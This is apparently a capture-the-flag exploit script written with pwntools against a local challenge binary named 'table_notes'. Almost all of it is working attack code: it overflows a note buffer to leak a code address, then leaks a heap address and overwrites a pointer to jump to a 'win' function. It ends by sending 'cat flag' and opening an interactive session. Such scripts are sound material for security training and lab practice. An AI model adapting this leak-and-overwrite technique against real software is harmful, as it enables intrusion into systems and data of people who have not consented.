#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template table_notes
from pwn import *

exe = context.binary = ELF(args.EXE or 'table_notes')

def start(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)
gdbscript = '''
tbreak main
continue
'''.format(**locals())
# io = start()
io = remote('localhost', 3773)

io.sendline(b'1')
io.sendline(b'A'*(8*4-1))
pause(1)
io.sendline(b'2')
io.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n")
leak = int(io.recvline()[:-1][::-1].hex(), 16)
print(hex(leak))
win = leak -0x2b2f
io.sendline(b'1')
io.send(b'A'*(8*4)+p64(leak)+b'\xd8')
pause(1)
io.sendline(b'2')
io.recvuntil(b'Note: ')
heap = int(io.recvline()[:-1][::-1].hex(), 16)
print(hex(heap))
io.sendline(b'1')
io.send(p64(heap-0x28))
pause(1)
io.sendline(b'1')
io.send(p64(win)+ p64(0)*3+p64(heap-0x28))
pause(1)
io.sendline(b'2')
io.sendline(b'cat flag')

io.interactive()

